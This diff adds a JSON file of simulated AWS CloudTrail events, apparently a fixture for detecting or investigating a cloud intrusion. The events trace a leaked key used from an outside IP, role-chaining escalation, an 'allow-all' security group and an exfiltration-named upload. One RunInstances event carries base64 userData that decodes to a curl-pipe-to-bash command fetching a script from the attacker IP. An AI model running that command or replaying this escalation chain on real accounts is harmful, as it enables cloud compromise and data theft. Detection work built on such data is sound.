@@ -1,0 +1,244 @@
+[
+  {
+    "id": "evt-001",
+    "eventTime": "2024-11-14T01:58:03Z",
+    "eventName": "ConsoleLogin",
+    "eventSource": "signin.amazonaws.com",
+    "sourceIPAddress": "10.0.4.22",
+    "userAgent": "Mozilla/5.0",
+    "userIdentity": {
+      "type": "IAMUser",
+      "userName": "ops-team",
+      "accountId": "123456789012",
+      "accessKeyId": "AKIAIOSFODNN7OPSTEAM"
+    },
+    "awsRegion": "eu-west-1",
+    "responseElements": { "ConsoleLogin": "Success" }
+  },
+  {
+    "id": "evt-002",
+    "eventTime": "2024-11-14T02:15:07Z",
+    "eventName": "GetCallerIdentity",
+    "eventSource": "sts.amazonaws.com",
+    "sourceIPAddress": "10.0.4.22",
+    "userAgent": "aws-cli/2.13.0",
+    "userIdentity": {
+      "type": "IAMUser",
+      "userName": "ops-team",
+      "accountId": "123456789012",
+      "accessKeyId": "AKIAIOSFODNN7OPSTEAM"
+    },
+    "awsRegion": "us-east-1"
+  },
+  {
+    "id": "evt-003",
+    "eventTime": "2024-11-14T03:02:44Z",
+    "eventName": "ListBuckets",
+    "eventSource": "s3.amazonaws.com",
+    "sourceIPAddress": "10.0.4.22",
+    "userAgent": "aws-cli/2.13.0",
+    "userIdentity": {
+      "type": "IAMUser",
+      "userName": "ops-team",
+      "accountId": "123456789012",
+      "accessKeyId": "AKIAIOSFODNN7OPSTEAM"
+    },
+    "awsRegion": "eu-west-1"
+  },
+  {
+    "id": "evt-004",
+    "eventTime": "2024-11-14T03:44:12Z",
+    "eventName": "AssumeRole",
+    "eventSource": "sts.amazonaws.com",
+    "sourceIPAddress": "10.0.2.15",
+    "userAgent": "Boto3/1.28.0",
+    "userIdentity": {
+      "type": "IAMUser",
+      "userName": "ci-runner",
+      "accountId": "123456789012",
+      "accessKeyId": "AKIAIOSFODNN7CIRUN01"
+    },
+    "awsRegion": "us-east-1",
+    "requestParameters": {
+      "roleArn": "arn:aws:iam::123456789012:role/DeployRole",
+      "roleSessionName": "ci-deploy-session"
+    },
+    "responseElements": {
+      "credentials": {
+        "accessKeyId": "ASIAIOSFODNN7DEPLOY1"
+      }
+    }
+  },
+  {
+    "id": "evt-006",
+    "eventTime": "2024-11-14T04:01:31Z",
+    "eventName": "GetCallerIdentity",
+    "eventSource": "sts.amazonaws.com",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "python-requests/2.31.0",
+    "userIdentity": {
+      "type": "IAMUser",
+      "userName": null,
+      "accountId": "123456789012",
+      "accessKeyId": "AKIAIOSFODNN7DEV01A3"
+    },
+    "awsRegion": "us-east-1"
+  },
+  {
+    "id": "evt-007",
+    "eventTime": "2024-11-14T04:03:59Z",
+    "eventName": "AssumeRole",
+    "eventSource": "sts.amazonaws.com",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "python-requests/2.31.0",
+    "userIdentity": {
+      "type": "IAMUser",
+      "userName": null,
+      "accountId": "123456789012",
+      "accessKeyId": "AKIAIOSFODNN7DEV01A3"
+    },
+    "awsRegion": "us-east-1",
+    "requestParameters": {
+      "roleArn": "arn:aws:iam::123456789012:role/DBSyncServiceRole",
+      "roleSessionName": "db-sync-check"
+    },
+    "responseElements": {
+      "credentials": {
+        "accessKeyId": "ASIAIOSFODNN7DBSYNC1",
+        "sessionToken": "IQoJb3JpZ2luX2VjEL1...",
+        "expiration": "2024-11-14T06:03:59Z"
+      },
+      "assumedRoleUser": {
+        "arn": "arn:aws:sts::123456789012:assumed-role/DBSyncServiceRole/db-sync-check"
+      }
+    }
+  },
+  {
+    "id": "evt-008",
+    "eventTime": "2024-11-14T04:07:22Z",
+    "eventName": "AssumeRole",
+    "eventSource": "sts.amazonaws.com",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "aws-cli/2.13.0",
+    "userIdentity": {
+      "type": "AssumedRole",
+      "userName": null,
+      "accountId": "123456789012",
+      "accessKeyId": "ASIAIOSFODNN7DBSYNC1",
+      "sessionContext": {
+        "sessionIssuer": {
+          "type": "Role",
+          "arn": "arn:aws:iam::123456789012:role/DBSyncServiceRole"
+        }
+      }
+    },
+    "awsRegion": "us-east-1",
+    "requestParameters": {
+      "roleArn": "arn:aws:iam::123456789012:role/AutomationServiceRole",
+      "roleSessionName": "auto-deploy-run"
+    },
+    "responseElements": {
+      "credentials": {
+        "accessKeyId": "ASIAIOSFODNN7AUTO002",
+        "sessionToken": "FwoGZXIvYXdzEMf3...",
+        "expiration": "2024-11-14T06:07:22Z"
+      },
+      "assumedRoleUser": {
+        "arn": "arn:aws:sts::123456789012:assumed-role/AutomationServiceRole/auto-deploy-run"
+      }
+    }
+  },
+  {
+    "id": "evt-009",
+    "eventTime": "2024-11-14T04:09:47Z",
+    "eventName": "RunInstances",
+    "eventSource": "ec2.amazonaws.com",
+    "sourceIPAddress": "ec2.amazonaws.com",
+    "userAgent": "aws-sdk-go/1.48.2 (go1.21.3; linux; amd64)",
+    "userIdentity": {
+      "type": "AssumedRole",
+      "userName": null,
+      "accountId": "123456789012",
+      "accessKeyId": "ASIAIOSFODNN7AUTO002",
+      "sessionContext": {
+        "sessionIssuer": {
+          "type": "Role",
+          "arn": "arn:aws:iam::123456789012:role/AutomationServiceRole",
+          "accountId": "123456789012"
+        },
+        "sourceIdentity": "auto-deploy-run"
+      }
+    },
+    "awsRegion": "eu-west-1",
+    "requestParameters": {
+      "instanceType": "t3.large",
+      "imageId": "ami-0c02fb55956c7d316",
+      "minCount": 1,
+      "maxCount": 1,
+      "userData": "IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vMTg1LjIyMC4xMDEuNDcvYy5zaCB8IGJhc2g="
+    },
+    "responseElements": {
+      "instanceId": "i-0a1b2c3d4e5f67890"
+    }
+  },
+  {
+    "id": "evt-010",
+    "eventTime": "2024-11-14T04:12:05Z",
+    "eventName": "CreateSecurityGroup",
+    "eventSource": "ec2.amazonaws.com",
+    "sourceIPAddress": "ec2.amazonaws.com",
+    "userAgent": "aws-sdk-go/1.48.2",
+    "userIdentity": {
+      "type": "AssumedRole",
+      "userName": null,
+      "accountId": "123456789012",
+      "accessKeyId": "ASIAIOSFODNN7AUTO002",
+      "sessionContext": {
+        "sessionIssuer": {
+          "type": "Role",
+          "arn": "arn:aws:iam::123456789012:role/AutomationServiceRole"
+        }
+      }
+    },
+    "awsRegion": "eu-west-1",
+    "requestParameters": { "groupName": "allow-all-temp", "description": "temporary" }
+  },
+  {
+    "id": "evt-011",
+    "eventTime": "2024-11-14T04:31:18Z",
+    "eventName": "PutObject",
+    "eventSource": "s3.amazonaws.com",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "python-requests/2.31.0",
+    "userIdentity": {
+      "type": "IAMUser",
+      "userName": null,
+      "accountId": "123456789012",
+      "accessKeyId": "AKIAIOSFODNN7DEV01A3"
+    },
+    "awsRegion": "eu-west-1",
+    "requestParameters": {
+      "bucketName": "corp-data-backup-prod",
+      "key": "exfil_dump_20241114.tar.gz"
+    }
+  },
+  {
+    "id": "evt-013",
+    "eventTime": "2024-11-14T05:51:03Z",
+    "eventName": "RunInstances",
+    "eventSource": "ec2.amazonaws.com",
+    "sourceIPAddress": "10.0.4.22",
+    "userAgent": "aws-cli/2.13.0",
+    "userIdentity": {
+      "type": "IAMUser",
+      "userName": "ops-team",
+      "accountId": "123456789012",
+      "accessKeyId": "AKIAIOSFODNN7OPSTEAM"
+    },
+    "awsRegion": "eu-west-1",
+    "requestParameters": {
+      "instanceType": "t3.micro",
+      "imageId": "ami-0d1bf5b68307103c2"
+    }
+  }
+]
